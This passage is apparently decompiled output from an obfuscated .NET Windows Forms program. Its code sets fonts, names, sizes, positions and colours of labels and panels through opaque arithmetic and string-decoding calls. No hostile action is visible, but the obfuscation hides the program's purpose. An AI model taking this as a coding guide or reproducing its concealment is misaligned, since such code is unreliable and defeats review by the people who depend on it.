		array68[~array2[103]] = string.Concat(char.ToString((char)((Array)(object)"\u030c\u0348\u0361\u0351\u034b.\u034d\u0354\u030e\u030d\u032e\u033e\u0339").Length), char.ToString('\0') + char.ToString('\0') + "\0\u0002");
		array68[4] = 157;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_64, array68);
		array66[hasFlagsAttribute] = ((num83 == Convert.ToInt32(string_64, 8)) ? _003CModule_003E.LoadVector128[22] : (_003CModule_003E.get_PositiveSign[39] ^ array2[op_LessThan]));
		char c22 = (char)(ResolveMethod << Marshal.SizeOf(typeof(UseHebrewParsing)) >> 23);
		int num85 = c22;
		int num86 = ((0 != array6[Convert.ToInt32("0", _003CModule_003E.get_PositiveSign[3])]) ? (0xB24F0 ^ checked(int_1 * array2[2])) : 619);
		array66[num85] = num86;
		_003CModule_003E.GetMaxByteCount(ref string_62, array66);
		string text40 = string_62;
		int num87 = -252261 - ((array[81] >= Convert.ToInt32("11101100011000001101", 2)) ? set_Metadata : (-252261));
		string string_65 = string.Concat(char.ToString((char)Convert.ToInt32("29d6", 16)), char.ToString('⧗') + "⧗⧖", char.ToString('⧗') + "⧗⧖⧖⧗⧗⧗⧖⧖⧗⧗⧖⧖⧖⧗⧖");
		object[] array69 = new object[194525644 / Marshal.SizeOf(typeof(Digit400))];
		array69[0] = (int)array[27];
		array69[1] = 1142;
		array69[array2[0]] = Convert.ToInt32("13727470260", 8) / 4938348;
		array69[array2[148] / Convert.ToInt32("28245633", 16)] = Marshal.SizeOf(typeof(add_UnhandledException)) + -584362;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_65, array69);
		int num88 = checked(num87 * Convert.ToInt32(string_65, 2));
		string string_66 = string.Concat(char.ToString((char)array2[149]), char.ToString((char)DeserializationTracker), char.ToString('婵') + "婳婳婶婵");
		object[] array70 = new object[(nint)((Array)(object)(char.ToString('\u0358') + char.ToString('\u0365') + "\u0338\u030d")).LongLength];
		array70[get_PositiveInfinity] = checked(_003CModule_003E.KeyValuePair__2[111] * 87);
		array70[1] = array2[150] ^ 0xDA017;
		array70[Stream] = 'ѵ';
		array70[3] = Convert.ToInt32(char.ToString('1') + char.ToString('6') + "13", sizeof(decimal));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_66, array70);
		int num89 = Convert.ToInt32(string_66, 8);
		int[] dequeue2 = _003CModule_003E.Dequeue;
		int num90 = Convert.ToInt32("1101", 2);
		((Control)setSize).set_Font(new Font(text40, 14.25f, (FontStyle)num88, (GraphicsUnit)(num89 ^ dequeue2[num90]), (byte)(0 & ((nint)((Array)(object)string.Empty).LongLength << 90 % _003CModule_003E.ActivityOptions[39]))));
		((Control)SetSize).set_ForeColor(SystemColors.Control);
		((Control)SetSize).set_Location(new Point((BindType + -523552) ^ -223877 ^ -474679, 96));
		Label setSize2 = SetSize;
		string text41 = char.ToString('䵵');
		string text42 = char.ToString((char)((130 << CreateGlobalFunctions) | '౸'));
		string text43 = char.ToString((char)array2[28]);
		string string_67 = char.ToString((char)Convert.ToInt32("160315", 8)) + "\ue0c4\ue09a";
		object[] array71 = new object[Convert.ToInt32("2", array[8])];
		array71[Convert.ToInt32("1", 2) & (nint)((Array)(object)string.Empty).LongLength] = 33695;
		array71[(nint)((Array)(object)"\u0342").LongLength] = "ႎᦄ";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_67, array71);
		string string_68 = string.Concat(text41, text42, text43 + string_67);
		int num91 = 6 & array[array2[100]];
		object[] array72 = new object[num91];
		int num92 = _003CModule_003E.LoadVector128[get_PositiveInfinity >> Convert.ToInt32("10", 2)];
		char c23 = (char)((843365 * Convert.ToInt32("1", 8)) ^ array2[29]);
		array72[num92] = (int)c23;
		int num93 = (Convert.ToInt32("37762316030", 8) % -1425808) ^ 0xEAE67 ^ ((checked(Convert.ToInt32("37777321650", 8) + 214127) != Convert.ToInt32(char.ToString('6') + char.ToString('3') + "cc", 16)) ? (-385846 + Convert.ToInt32("19494", 16)) : ParseNumbers);
		string text44 = char.ToString('\u0e3c');
		char c24 = (char)array2[151];
		string text45 = char.ToString(c24);
		string string_69 = string.Concat(char.ToString('贺'), char.ToString('脎') + char.ToString('蝦') + "蔮蔯");
		object[] array73 = new object[3];
		array73[AsInt64 - Convert.ToInt32("37776257102", 8)] = checked(IntroducedMethodEnumerator + _003CModule_003E.ActivityOptions[139]);
		array73[Marshal.SizeOf(typeof(UseHebrewParsing))] = "\u0e5c\u1ad4";
		array73[checked(-301973 + _003CModule_003E.ActivityOptions[140])] = string.Concat(char.ToString('≴'), char.ToString('ྋ') + "ձ፩\u0019\u00181");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_69, array73);
		array72[num93] = string.Concat(text44, text45 + string_69);
		array72[2] = _003CModule_003E.Dequeue[14] ^ ((_003CModule_003E.KeyValuePair__2[35] == -16927) ? 563709 : Convert.ToInt32(char.ToString('f') + "ff33178", _003CModule_003E.KeyValuePair__2[2]));
		string string_70 = "綐綕";
		object[] array74 = new object[Convert.ToInt32(char.ToString('1') + "01", 2)];
		array74[0] = 'ȳ';
		array74[get_CurrencyGroupSeparator] = ValueTuple__8 | 0x1A52;
		array74[2] = 1689;
		array74[endAction] = string.Concat("VШ", char.ToString('B') + char.ToString('k') + "ǈP");
		array74[4] = string.Concat(char.ToString('ᬳ'), char.ToString('ᢸ') + "\u07aaι፯");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_70, array74);
		array72[3] = (byte)(Convert.ToInt32(string_70, Marshal.SizeOf(typeof(__c__DisplayClass0_6))) >> (-506291 ^ Marshal.SizeOf(typeof(SetSafeWaitHandle))) * checked(-1 * _003CModule_003E.ActivityOptions[2])) != 0;
		_003CModule_003E.GetMaxByteCount(ref string_68, array72);
		((Control)setSize2).set_Name(string_68);
		Label setSize3 = SetSize;
		string text46 = char.ToString('1');
		string string_71 = string.Concat(char.ToString((char)Convert.ToInt32("cb23", 16)), char.ToString('쬢') + char.ToString('쬢') + "쬣쬢");
		object[] array75 = new object[Convert.ToInt32(char.ToString('1') + "01", 2)];
		array75[_003CModule_003E.ActivityOptions[1]] = checked(414752 - Convert.ToInt32("62b3a", 16));
		array75[Convert.ToInt32("1", _003CModule_003E.KeyValuePair__2[2])] = 4867 << (int)array[3];
		array75[2] = (byte)get_PositiveInfinity != 0;
		int num94 = default(int);
		switch (0 / Convert.ToInt32("1100000011", 2))
		{
		case 0:
			num94 = 3;
			break;
		case 1:
			num94 = Convert.ToInt32("bf264", 16);
			break;
		case 2:
			num94 = 56372;
			break;
		}
		array75[num94] = char.ToString('༩') + "ý\u0b78";
		array75[4] = array[28];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_71, array75);
		string value3 = text46 + string_71;
		int num95 = default(int);
		switch (GetLower)
		{
		case -78032:
			num95 = array2[152];
			break;
		case -78031:
			num95 = 792125;
			break;
		case -78030:
			num95 = 2;
			break;
		}
		((Control)setSize3).set_Size(new Size(Convert.ToInt32(value3, num95 | 0), Marshal.SizeOf(typeof(ShiftRightLogicalNarrowingUpper))));
		((Control)SetSize).set_TabIndex(array6[(427685 % GetCustomAttributes > 416335) ? (-913844) : (Convert.ToInt32("2", 16) << Convert.ToInt32("1", 16))]);
		Label setSize4 = SetSize;
		string text47 = char.ToString('ᅠ');
		char c25 = (char)(Convert.ToInt32("228e7a", 16) >> 9);
		string text48 = char.ToString(c25);
		string string_72 = "\uf8f9\uf8f0";
		int num96 = Convert.ToInt32("11", 2);
		object[] array76 = new object[num96];
		array76[0] = (char)Convert.ToInt32(char.ToString('4') + "66c", Convert.ToInt32("10", 16));
		array76[Convert.ToInt32("11111111111101100111101111100000", 2) + 623649] = -32738 - get_FriendlyName;
		array76[2] = Marshal.SizeOf(typeof(__1__state));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_72, array76);
		string string_73 = text47 + text48 + string_72;
		int num97 = default(int);
		switch (588886105 / array2[153])
		{
		case 0:
			num97 = 316715;
			break;
		case 1:
			num97 = 1;
			break;
		case 2:
			num97 = -294487;
			break;
		}
		object[] array77 = new object[(num97 | 0) << sizeof(bool)];
		array77[(nint)((Array)(object)string.Empty).LongLength] = array6[(array2[30] <= Convert.ToInt32(char.ToString('b') + char.ToString('7') + "ba5", 16)) ? 5 : (-800700)];
		int[] dequeue3 = _003CModule_003E.Dequeue;
		int num98 = ((82056 == checked(array2[154] + -59389)) ? Convert.ToInt32("0", array[1]) : (-326432));
		int num99 = dequeue3[num98];
		string text49 = char.ToString((char)checked(3062 * (Convert.ToInt32("1", 16) * 1)));
		string text50 = char.ToString('Ȝ');
		string string_74 = "㸰㻎";
		object[] array78 = new object[2];
		array78[0] = (int)array[29];
		array78[(uint)array[3]] = (char)_003CModule_003E.get_PositiveSign[32];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_74, array78);
		array77[num99] = string.Concat(text49, text50 + string_74);
		_003CModule_003E.GetMaxByteCount(ref string_73, array77);
		((Control)setSize4).set_Text(string_73);
		((Control)AllowHexSpecifier).set_AutoSize((byte)Marshal.SizeOf(typeof(IsTvOS)) != 0);
		Label allowHexSpecifier = AllowHexSpecifier;
		string text51 = char.ToString('ﯯ');
		string text52 = char.ToString((char)checked(Marshal.SizeOf(typeof(Brfalse)) - 852432));
		string string_75 = "펏펇";
		object[] array79 = new object[Convert.ToInt32("5", array[8])];
		array79[0] = (char)checked(Convert.ToInt32("37777361761", 8) - -141160);
		int num100 = ((Convert.ToInt32("ffffdce1", 16) <= HebrewValue) ? 1 : (-530373));
		int num101 = Convert.ToInt32("515", 8);
		array79[num100] = num101;
		array79[Stream] = 4479;
		array79[(uint)array[5]] = false;
		array79[954010800 / Convert.ToInt32("1615641454", 8)] = 2607;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_75, array79);
		string text53 = string_75;
		string string_76 = string.Concat(char.ToString('뫯'), char.ToString('몪') + "뫟뫃");
		object[] array80 = new object[Convert.ToInt32(char.ToString('1') + "01", Convert.ToInt32("2", 16))];
		array80[0 | array2[1]] = 7753;
		array80[(nint)((_003CModule_003E.get_PositiveSign[156] == -89977) ? 449656 : ((Array)(object)"\u0326").LongLength)] = Marshal.SizeOf(typeof(Varpush));
		array80[(Convert.ToInt32("10100011011000101", 2) == -78255) ? (-29548) : 2] = 'Њ';
		char c26 = (char)get_DeclaredConstructors;
		array80[3] = (int)c26;
		array80[Convert.ToInt32("4", 16)] = 'Ӊ';
		_003CModule_003E.TAIWANLUNISOLAR(ref string_76, array80);
		string string_77 = string.Concat(text51, text52, text53 + string_76);
		object[] array81 = new object[PreserveBaseOverridesAttribute];
		array81[0] = (byte)(array4[1] & SAKA) != 0;
		int num102 = array6[_003CModule_003E.Dequeue[0]];
		int num103;
		int num104;
		checked
		{
			num103 = -150694 + unchecked(4774 * array[68]);
			num104 = ((Array)(object)string.Empty).Length;
		}
		int num105 = default(int);
		switch (num104 % Convert.ToInt32("11111" + "1111111" + "10000111000001010011", 2))
		{
		case 0:
		{
			char c27 = (char)Convert.ToInt32("1284", 16);
			num105 = c27;
			break;
		}
		case 1:
			num105 = ThreadInterrupted;
			break;
		}
		array81[num102] = num103 | num105;
		array81[(uint)(~(BSTRMarshaler / Convert.ToInt32("1", 2))) | ((uint)array[3] << Convert.ToInt32("1", 2))] = ((((Convert.ToInt32("37" + "777777555", 8) <= -540700) ? Convert.ToInt32("1010" + char.ToString('0') + "111111110000010", Convert.ToInt32("10", 2)) : 51908) == 51908) ? (216560 % (_003CModule_003E.ActivityOptions[141] / 16044)) : (-522450));
		_003CModule_003E.GetMaxByteCount(ref string_77, array81);
		string text54 = string_77;
		string string_78 = string.Concat(char.ToString('鐶'), char.ToString('鐱'), char.ToString('鑥') + "鐹鑤");
		object[] array82 = new object[4];
		array82[0] = string.Concat(char.ToString('ᖉ'), char.ToString('ļ') + "\u008dà\u05c4");
		array82[sizeof(bool)] = checked(-16273 * Convert.ToInt32("ffffffff", 16));
		array82[2] = 7557;
		char c28 = (char)_003CModule_003E.KeyValuePair__2[0];
		array82[(int)c28] = (char)(~Convert.ToInt32("37777763412", 8));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_78, array82);
		int num106 = Convert.ToInt32(string_78, 16);
		int num107 = LessThan | 0x776BEB4A;
		int num108 = default(int);
		switch (array2[1] % Convert.ToInt32("1110001111100010110", 2))
		{
		case 0:
			num108 = -200078;
			break;
		case 1:
			num108 = 610647;
			break;
		case 2:
			num108 = -124574;
			break;
		}
		int num109 = default(int);
		switch (num106 + (num107 & num108))
		{
		case 0:
			num109 = checked(SignatureByRefType + -848936) / 17967766;
			break;
		}
		int num110 = num109;
		string string_79 = string.Concat(char.ToString('屪') + "屪屪", "屪屪" + "屪屪屪屪屪屪屪屪" + "屪屪屪屪屪屪屪屪屪屫屫屪屪屫屫屪屫屪屫");
		object[] array83 = new object[3];
		array83[0] = Convert.ToInt32(char.ToString('3') + char.ToString('2') + "035", array2[97]);
		array83[1] = Marshal.SizeOf(typeof(Popi_pop1));
		array83[checked(Convert.ToInt32("11111111111111101110001111110111", 2) + 72715)] = string.Concat(char.ToString('u'), char.ToString('ǖ') + char.ToString('œ') + "Ɖ?");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_79, array83);
		((Control)allowHexSpecifier).set_Font(new Font(text54, 14.25f, (FontStyle)num110, (GraphicsUnit)3, (byte)(0 / Convert.ToInt32(string_79, Convert.ToInt32("89997f", 16) >> 22))));
		((Control)AllowHexSpecifier).set_ForeColor(SystemColors.Control);
		Label allowHexSpecifier2 = AllowHexSpecifier;
		int num111 = default(int);
		switch (checked(-780974 + ~array2[155]))
		{
		case 0:
			num111 = Convert.ToInt32("11111111111101100111100001001101", 2) ^ 0x3F3E6;
			break;
		case 1:
			num111 = Marshal.SizeOf(typeof(IsPointer));
			break;
		case 2:
			num111 = Convert.ToInt32(char.ToString('e') + "569", 16);
			break;
		}
		int x2 = 635 % num111;
		int y2 = checked(_003CModule_003E.get_PositiveSign[40] + -549239);
		((Control)allowHexSpecifier2).set_Location(new Point(x2, y2));
		Label allowHexSpecifier3 = AllowHexSpecifier;
		string text55 = char.ToString((char)('•' | Marshal.SizeOf(typeof(IsAssignableFrom))));
		string text56 = char.ToString((char)array2[31]);
		string string_80 = char.ToString(array[82]) + char.ToString((char)Version) + "묺뭥";
		object[] array84 = new object[5];
		array84[0] = 351;
		array84[_003CModule_003E.ActivityOptions[2]] = checked(Convert.ToInt32("10101000101111110000", 2) - 686278);
		array84[(uint)array[1]] = string.Concat(char.ToString('\u0099'), char.ToString('Q'), char.ToString('%') + char.ToString('\u0017') + "\f\a");
		array84[3] = 199;
		array84[4] = 2191;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_80, array84);
		string string_81 = string.Concat(text55, text56 + string_80);
		object[] array85;
		checked
		{
			array85 = new object[unchecked(_003CModule_003E.ActivityOptions[29] % (Convert.ToInt32("efcf8", 16) ^ 0xAF96C)) + unchecked(_003CModule_003E.get_PositiveSign[41] % -263560)];
		}
		array85[0 * _003CModule_003E.CalendarType[Convert.ToInt32(char.ToString('1') + char.ToString('0') + "000", 2)]] = (byte)array6[SAKA] != 0;
		char c29 = array[16];
		int num112 = c29;
		array85[sizeof(sbyte)] = num112;
		char num113 = array4[((10713 > Convert.ToInt32("37776425016", 8)) ? 177731 : (-370657)) + -177728];
		int num114 = Convert.ToInt32(char.ToString('f') + char.ToString('f') + "ce8cf5", 16);
		int num115 = ((array[83] < 303690) ? (-3) : GetInt32);
		array85[(uint)num113] = num114 * num115 >> (Convert.ToInt32("b", 16) & 0xD);
		int num118;
		string text57;
		checked
		{
			int num116 = -270273 + Convert.ToInt32(char.ToString('1') + char.ToString('0') + "17702", 8);
			int num117 = -721016 + array2[156];
			array85[num116 | num117] = unchecked((char)Marshal.SizeOf(typeof(CompareInfo)));
			num118 = array6[_003CModule_003E.KeyValuePair__2[156] - -293027] | ~_003CModule_003E.KeyValuePair__2[20];
			text57 = char.ToString('ŝ');
		}
		string text58 = char.ToString((char)((-5346 == _003CModule_003E.ActivityOptions[30]) ? 'ѳ' : _003CModule_003E.get_PositiveSign[42]));
		int num119 = default(int);
		switch (Convert.ToInt32("37776646671", 8))
		{
		case -307783:
			num119 = 412;
			break;
		}
		string text59 = char.ToString((char)num119);
		string string_82 = "짤졞";
		object[] obj12 = new object[6]
		{
			Convert.ToInt32(char.ToString('3') + "cbb", 16),
			null,
			null,
			null,
			null,
			null
		};
		int num120 = _003CModule_003E.ActivityOptions[2];
		obj12[num120] = 18876;
		obj12[(nint)((Array)(object)"\u0329\u0366\u0318").LongLength & 2] = Convert.ToInt32(char.ToString('3') + "c9", 16);
		int num121 = array[2];
		obj12[3] = (byte)num121 != 0;
		obj12[(int)array[84] >> 7] = (char)(Convert.ToInt32("fff75f69", 16) + 581322);
		obj12[93795 >> get_CurrentReadCount] = Marshal.SizeOf(typeof(InMemoryAssemblyLoader));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_82, obj12);
		array85[num118] = string.Concat(text57, text58, text59 + string_82);
		string text60 = char.ToString('\u0332');
		string text61 = char.ToString('\u0331');
		string string_83 = char.ToString('䑐') + "䑒䑏";
		object[] array86 = new object[FlattenHierarchy];
		array86[0] = array[30];
		array86[get_CurrencyGroupSeparator] = string.Concat(char.ToString('G'), char.ToString('\u0016'), char.ToString('"') + "\u0019\u0002");
		array86[1 << Convert.ToInt32("1", 8)] = Convert.ToInt32("11" + "0000001", Convert.ToInt32("10", 2));
		int num122 = ((-9194 != Convert.ToInt32("37777756026", 8)) ? 627772 : 308);
		array86[3] = num122;
		array86[4] = string.Concat(char.ToString('\u0018'), char.ToString('\n'), char.ToString('\u0002') + "\n\u0001\u0004");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_83, array86);
		IntPtr intPtr3 = (nint)((Array)(object)(text60 + text61 + string_83)).LongLength;
		string string_84 = string.Concat(char.ToString('靼') + "靽靼", "靼靽" + "靽靽靽靽靼靼靽靼靽");
		object[] array87 = new object[~Convert.ToInt32("fffffffa", 16)];
		array87[0] = 642;
		array87[array2[2]] = false;
		array87[sizeof(ushort)] = 34825;
		array87[3] = 577;
		array87[get_ResourceExposureLevel] = Convert.ToInt32(char.ToString('5') + "201", 8);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_84, array87);
		string text62 = char.ToString((char)Convert.ToInt32(string_84, 2));
		string string_85 = "ᑖ\u0596";
		object[] array88 = new object[2];
		array88[0] = 4424;
		array88[Convert.ToInt32("3454274", 8) - 940219] = "`^";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_85, array88);
		array85[(nint)intPtr3] = text62 + string_85;
		_003CModule_003E.GetMaxByteCount(ref string_81, array85);
		((Control)allowHexSpecifier3).set_Name(string_81);
		((Control)AllowHexSpecifier).set_Size(new Size(147, _003CModule_003E.Dequeue[2]));
		Label allowHexSpecifier4 = AllowHexSpecifier;
		string string_86 = string.Concat(char.ToString('\uaab0'), char.ToString('ꫝ'), char.ToString('ꫨ') + "\uaad4ꪒ");
		object[] array89 = new object[(uint)array[7]];
		array89[get_PositiveInfinity] = string.Concat(char.ToString('\u034b'), char.ToString((char)_003CModule_003E.ActivityOptions[117]), char.ToString('ð') + "\u001e\u0004\u0001\u0002");
		array89[1 * Convert.ToInt32("1", 2)] = 55;
		array89[sizeof(char)] = string.Concat(char.ToString('ड़'), char.ToString('㘩') + "ආɿr");
		array89[3] = (char)get_Count;
		array89[checked(-699030 + Marshal.SizeOf(typeof(set_PositiveInfinitySymbol)))] = char.ToString('\u0017') + "\u0004\t";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_86, array89);
		int tabIndex2 = default(int);
		switch ((nint)((Array)(object)string_86).LongLength % Marshal.SizeOf(typeof(GetMethodBody)))
		{
		case 0:
			tabIndex2 = array6[21];
			break;
		case 1:
			tabIndex2 = 6;
			break;
		case 2:
			tabIndex2 = _003CModule_003E.CalendarType[Convert.ToInt32("21", 8) | 0x11];
			break;
		}
		((Control)allowHexSpecifier4).set_TabIndex(tabIndex2);
		Label allowHexSpecifier5 = AllowHexSpecifier;
		string text63 = char.ToString('É');
		string string_87 = char.ToString('戮') + "淪吏";
		object[] array90 = new object[4];
		array90[245534 >> Marshal.SizeOf(typeof(GetAbbreviatedDayName))] = (byte)get_PositiveInfinity != 0;
		array90[1] = get_UserMessage;
		array90[2] = 2661;
		array90[(uint)array[5]] = DebuggerBrowsableState;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_87, array90);
		string text64 = text63 + string_87;
		string text65 = char.ToString((char)(Marshal.SizeOf(typeof(SerializationInfoTable)) & IsInterface));
		string string_88 = string.Concat("\uf74d\uf77a", "\uf772\uf77e", char.ToString('\uf776') + char.ToString('\uf771') + "\uf776\uf771\uf778");
		object[] array91 = new object[Marshal.SizeOf(typeof(ENODATA))];
		int num123 = default(int);
		switch (151838 - array2[159])
		{
		case 0:
			num123 = 0;
			break;
		}
		array91[num123] = string.Concat("о⨋", char.ToString('Ђ') + char.ToString('\u0001') + "B,");
		array91[Convert.ToInt32("1", 2)] = string.Concat(char.ToString('ꡢ'), char.ToString('ӱ') + char.ToString('ރ') + "߹Ȋȸη");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_88, array91);
		string string_89 = string.Concat(text64, text65 + string_88);
		object[] array92 = new object[2];
		string string_90 = "撛";
		object[] array93 = new object[3];
		array93[0] = 3721;
		array93[array2[Convert.ToInt32("2", 8)]] = Convert.ToInt32(char.ToString('1') + char.ToString('1') + "100010000110", 2);
		array93[-663117 ^ array2[160]] = string.Concat(char.ToString((char)Convert.ToInt32("1ad9", 16)), char.ToString((char)array2[98]), char.ToString('ſ') + "\u001e\u001a\b");
		_003CModule_003E.TAIWANLUNISOLAR(ref string_90, array93);
		array92[(uint)array4[Convert.ToInt32(string_90, 2)]] = (char)Marshal.SizeOf(typeof(ELEMENT_TYPE_OBJECT));
		int num124 = Convert.ToInt32("15", Marshal.SizeOf(typeof(__c__DisplayClass0_6)));
		string string_91 = "\u058c";
		object[] obj13 = new object[5]
		{
			string.Concat(char.ToString('И'), char.ToString('t') + char.ToString('¤') + "\u0011\u0005\u0006\u0004"),
			array[Convert.ToInt32("15", 8)],
			_003CModule_003E.get_PositiveSign[43],
			')',
			null
		};
		char c30 = (char)_003CModule_003E.ActivityOptions[3];
		obj13[(uint)c30] = (byte)((Array)(object)string.Empty).Length != 0;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_91, obj13);
		int num125 = num124 >> Convert.ToInt32(string_91, 16);
		char c31 = (char)checked((76847946 >> unchecked((int)array[13])) + array2[Convert.ToInt32("100000", 2)]);
		array92[num125] = (int)c31;
		_003CModule_003E.GetMaxByteCount(ref string_89, array92);
		((Control)allowHexSpecifier5).set_Text(string_89);
		Panel isTvOSVersionAtLeast = IsTvOSVersionAtLeast;
		int red2 = (_003CModule_003E.ActivityOptions[31] + 956480) ^ 0x89DA6;
		int green2 = checked(unchecked(1633465 % Convert.ToInt32("2374112", 8)) - (Convert.ToInt32("100101110111010001110", 2) + -914220)) % array6[22];
		string text66 = char.ToString('1');
		string text67 = char.ToString('0');
		string string_92 = char.ToString('\ue688') + char.ToString(array[86]) + "\ue688\ue689";
		object[] array94 = new object[4];
		array94[Convert.ToInt32("0", 16)] = string.Concat(char.ToString('㛤'), char.ToString('᪁'), char.ToString('\u0094') + char.ToString('c') + "ǲ\u02f2");
		array94[1] = char.ToString('Ԍ') + char.ToString('Ǻ') + "&\u000e";
		char c32 = (char)Convert.ToInt32("10", 2);
		array94[(uint)c32] = char.ToString((char)_003CModule_003E.KeyValuePair__2[159]) + "䴣\u1064";
		array94[Convert.ToInt32("11", Stream)] = 297;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_92, array94);
		string value4 = text66 + text67 + string_92;
		char c33 = (char)_003CModule_003E.ActivityOptions[1];
		int fromBase3 = default(int);
		switch ((int)c33 % _003CModule_003E.get_PositiveSign[_003CModule_003E.get_PositiveSign[106]])
		{
		case 0:
			fromBase3 = 2;
			break;
		case 1:
			fromBase3 = checked(_003CModule_003E.KeyValuePair__2[160] * -9);
			break;
		case 2:
			fromBase3 = 645232;
			break;
		}
		((Control)isTvOSVersionAtLeast).set_BackColor(Color.FromArgb(red2, green2, Convert.ToInt32(value4, fromBase3)));
		((Control)IsTvOSVersionAtLeast).set_ForeColor(SystemColors.ActiveCaptionText);
		((Control)IsTvOSVersionAtLeast).set_Location(new Point(array6[7 & MdFieldInfo & (658180446 / _003CModule_003E.get_PositiveSign[158])], array6[(nint)((Array)(object)("\u035a\u0365\u0333\u033a" + "\u035b\u0306\u035c\u031d\u0324\u035c\u0308\u0325\u0362\u0319\u0340\u035b\u0339\u0305\u036b.\u0318\u0366\u035d")).LongLength] % (Convert.ToInt32("ff" + "fffffd", 16) & -6)));
		Panel isTvOSVersionAtLeast2 = IsTvOSVersionAtLeast;
		string string_93 = "懇懖";
		object[] array95 = new object[array2[3]];
		int num126 = Convert.ToInt32("0", 8);
		int num127 = default(int);
		switch (checked(CreateManifest + 226106))
		{
		case 0:
			num127 = array2[161];
			break;
		case 1:
			num127 = WaitForFullGCApproach;
			break;
		case 2:
			num127 = 38;
			break;
		}
		array95[num126] = (char)num127;
		array95[1] = string.Concat(char.ToString('\u0380'), char.ToString('\u0001'), char.ToString('v') + char.ToString('\0') + "\0\u0002");
		array95[Convert.ToInt32("2", 16) & Convert.ToInt32("10", 2)] = (int)array[Marshal.SizeOf(typeof(Unload))];
		int num128 = Marshal.SizeOf(typeof(CharSetMask));
		int num129 = _003CModule_003E.ActivityOptions[1];
		array95[num128] = (byte)num129 != 0;
		array95[(uint)array[Marshal.SizeOf(typeof(Stelem_Ref))]] = Convert.ToInt32("18", 16);
		array95[Convert.ToInt32("13716704504", 8) >> 28] = char.ToString('\0') + "\u0001\n";
		_003CModule_003E.TAIWANLUNISOLAR(ref string_93, array95);
		string text68 = string_93;
		string text69 = char.ToString((char)checked(586519 + Convert.ToInt32("37775674421", 8)));
		string text70 = char.ToString('氣');
		string string_94 = "ಞ\u0cc3";
		object[] array96 = new object[5];
		array96[(nint)((Array)(object)string.Empty).LongLength] = 12410;
		array96[sizeof(sbyte)] = ((2406 < Convert.ToInt32("143f3", 16)) ? Marshal.SizeOf(typeof(ProbabilisticMap)) : Convert.ToInt32("fffb1001", 16));
		array96[(nint)((_003CModule_003E.KeyValuePair__2[161] >= 118250) ? (-848995) : ((Array)(object)"\u030d\u032d").LongLength)] = (int)array[32];
		array96[(nint)((Array)(object)"\u0351\u0308\u0342").LongLength & Convert.ToInt32("3", 8)] = _003CModule_003E.KeyValuePair__2[36];
		array96[4] = array[33];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_94, array96);
		string string_95 = string.Concat(text68, text69 + text70 + string_94);
		int num130 = Marshal.SizeOf(typeof(ArrayListDebugView));
		object[] array97 = new object[num130];
		int num131 = default(int);
		switch (Marshal.SizeOf(typeof(OverlappedData)) % Stream)
		{
		case 0:
			num131 = 399024;
			break;
		case 1:
			num131 = -1;
			break;
		}
		int num132 = ~num131;
		checked
		{
			array97[num132] = unchecked(Convert.ToInt32("69b46e99", 16) / 1277 + -438755) - (1575182 - Convert.ToInt32("23" + "47117", 8));
		}
		array97[(1 * (nint)((Array)(object)"\u0354").LongLength) | (0 * Convert.ToInt32("fff52140", 16) << GenericMethodInfo)] = (char)_003CModule_003E.CalendarType[3];
		int actualValue = ActualValue;
		string string_96 = string.Concat(char.ToString('鬒') + "鬒鬒鬒鬒鬒鬒", "鬒鬒" + "鬒鬒鬒" + "鬒鬒鬒鬓鬒鬓鬓鬒鬓鬓鬒鬓鬒鬒鬒鬒鬒鬒鬓鬓");
		object[] array98 = new object[4];
		array98[Convert.ToInt32("0", 8)] = 'ᨀ';
		array98[1] = "ˑ୶";
		array98[Convert.ToInt32("1010011000011", 2) >> Convert.ToInt32("b", 16)] = (byte)Convert.ToInt32("0", 16) != 0;
		array98[_003CModule_003E.KeyValuePair__2[0]] = Convert.ToInt32("37777743222", 8) * -2;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_96, array98);
		int num133 = ((((Convert.ToInt32(string_96, 2) > 697230) ? 1 : 0) != ((Convert.ToInt32("37777722055", 8) != -23507) ? 739438 : 0)) ? ct : 0);
		array97[actualValue] = (byte)num133 != 0;
		_003CModule_003E.GetMaxByteCount(ref string_95, array97);
		((Control)isTvOSVersionAtLeast2).set_Name(string_95);
		Panel isTvOSVersionAtLeast3 = IsTvOSVersionAtLeast;
		string string_97 = char.ToString(array[87]) + "怸怽";
		object[] array99 = new object[3];
		array99[0] = 4664;
		array99[1] = 5207;
		array99[(uint)array[Convert.ToInt32("1", 16)]] = 14715;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_97, array99);
		char c34 = (char)Convert.ToInt32(string_97, sizeof(decimal));
		((Control)isTvOSVersionAtLeast3).set_Size(new Size(c34, 32));
		((Control)IsTvOSVersionAtLeast).set_TabIndex(checked((array2[Convert.ToInt32("100001", 2)] + Convert.ToInt32("ff" + "f2b61e", Convert.ToInt32("10", 16))) * -2));
		Panel obj14 = panel_0;
		int num134 = ((Convert.ToInt32("b440", 16) == Convert.ToInt32("37777625015", 8)) ? NegativeMonetaryNumberFormat : 35);
		int num135 = num134;
		char c35 = (char)num135;
		char red3 = c35;
		string string_98 = "崃崄";
		object[] array100 = new object[3];
		array100[Convert.ToInt32("0", 8)] = (char)checked(MethodSemanticsAttributes + -613615);
		array100[1] = string.Concat(char.ToString('ܯ'), char.ToString('Ś') + "\a(");
		array100[sizeof(short)] = 10711 << array2[2];
		_003CModule_003E.TAIWANLUNISOLAR(ref string_98, array100);
		string value5 = string_98;
